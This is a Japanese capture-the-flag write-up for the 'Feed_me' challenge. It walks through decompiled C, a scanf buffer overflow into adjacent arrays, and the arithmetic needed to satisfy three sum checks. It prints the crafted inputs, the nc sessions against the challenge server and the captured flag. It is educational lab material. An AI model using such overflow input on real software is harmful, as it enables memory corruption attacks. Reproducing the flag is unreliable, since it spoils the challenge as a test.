# Challenge

> Feed_me

> 150 point

> Can you cook the most delicious recipe?

> nc 159.89.166.12 9800

> file: challenge1

# Solution

### 1. デコンパイルツール(Ghidra)を使ってCのコードに変換する  
これについてtakachimaくんがやってくれた．デコンパイルされたコードはGitのリポジトリに置いた．  
というかデコンパイルされたコードが共有されたからこの問題に手を出した．

### 2. コードを読んでFlagを入手出来る条件を理解する  
コードの重要な部分からたどって読んでいく．Cになっているのでこの作業は大分楽である．このプログラムは以下の動作を行う．

1. 3つのint型変数，iVar4, iVar5, iVar6と3つのchar型配列local_76[10],  local_6c[10], local_62[10]を定義する．なお，これ以降簡単化のため，int型変数をそれぞれA,B,C char型配列をされぞれx,y,zとする．  
2. 現在時刻をシード値として 0 ～ -19998のランダムな偶数を3つ決めて，A,B,Cに格納する．  
3. **scanf**を使ってユーザーからの入力を受け付ける．入力をxに格納する（y, zには格納しない）．  
4. if(A == x+y), if(B==y+z), if(C==z+x)が満たさればFlagを出力して，そうでないならば失敗のメッセージを出力する．その後終了する．

プログラム以下の部分からフラグの入手方法が分かる．  
ここで，f(A == x+y), if(B==y+z), if(C==z+x)という条件文をすべて満たせばフラグが獲得出来ることが理解出来る．  
```  
 do {  
   sVar8 = strlen(local_76);  
   if (sVar8 <= (ulong)(long)local_9c) {  
     iVar4 = atoi(local_76);  
     iVar5 = atoi(local_6c);  
     iVar6 = atoi(local_62);  
     if (uVar1 == iVar5 + iVar4) {  
       if (uVar2 == iVar6 + iVar5) {  
         if (uVar3 == iVar4 + iVar6) {  
           __stream = fopen("flag.txt","r");  
           if (__stream == (FILE *)0x0) {  
             fwrite("\nflag.txt doesn\'texist.\n",1,0x19,stderr);  
                   /* WARNING: Subroutine does notreturn */  
             exit(0);  
           }  
           fgets(local_58,0x32,__stream);  
           printf("That\'s yummy.... Here is yourgift:\n%s",local_58);  
         }  
         else {  
           fail();  
         }  
       }  
       else {  
         fail();  
       }  
     }  
     else {  
       fail();  
     }  
```

次に，A, B, C, x, y, zがどのようにして決まるかを見ていく．  
A,B,Cはプログラム側がランダムに決めることが分かる．そして同時に，取りうる範囲が0 ～ -19998の偶数であることも分かる．  
```  
 tVar7 = time((time_t *)0x0);  
 srand((uint)tVar7);  
 iVar4 = rand();  
 uVar1 = (iVar4 % 10000) * -2;  
 iVar4 = rand();  
 uVar2 = (iVar4 % 10000) * -2;  
 iVar4 = rand();  
 uVar3 = (iVar4 % 10000) * -2;

```

xは`__isoc99_scanf(&DAT_00100de2,local_76);`の1文によってユーザーから入力される．`__isoc99_scanf`は標準入力から値を受け取るscanf関数である．  
y, zはプログラムないでは変更されない(左辺にこない)．  
y,
zを適切にさだめなければFlagはとれないが，y,zに値を入れる方法はない．ここで変数宣言部を見てみるとchar型配列のx,y,zは連続して宣言されている．

```  
 int local_9c;  
 char local_76 [10];  
 char local_6c [10];  
 char local_62 [10];  
 char local_58 [56];  
 long local_20;  
```  
ここで，scanfでバッファオーバーフローを起こしてy,zに値を入れられるのでは？と思った．

### 3. バッファオーバーフローを利用して３つの変数にあを格納する  
入力された値はatoi関数で数値化されるので，ここにいい感じの数値を打ち込んでやればいい．  
各変数の配列長は10なので，余っている部分は0埋めする．

x,y,zの条件は，if文を等式とみなして連立方程式を解くと  
- x = 1/2(A-B+C)  
- y = 1/2(A+B-C)  
- z = 1/2(-A+B+C)  
であることが分かる．あ^～，だからA,B,Cは2の倍数だったんですね．

それを踏まえて入力．．．  
```  
$ nc 159.89.166.12 9800  
Can you cook my favourite food using these ingredients :)  
-1530 ; -4376 ; -15962 ;  
-0000065580000005028-000009404  
No, I dont want this... :(  
```

あれ～おかしいね旗取れないね: と思ったら数字が偏っているせいでxとyが１つの数字として認識されてしまっている．  
もう１度トライ．

```  
$ nc 159.89.166.12 9800  
Can you cook my favourite food using these ingredients :)  
-11014 ; -10620 ; -13566 ;  
-000006980-000004034-000006586  
That's yummy.... Here is your gift:  
pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}  
```

# Clue  
- atioは記号を認識してくれるので数字偏っても先頭に+をつければ分けてくれると思う

Original writeup (https://github.com/wani-hackase/wani-
writeup/tree/master/2019/03-pragyan/bin-feed-me).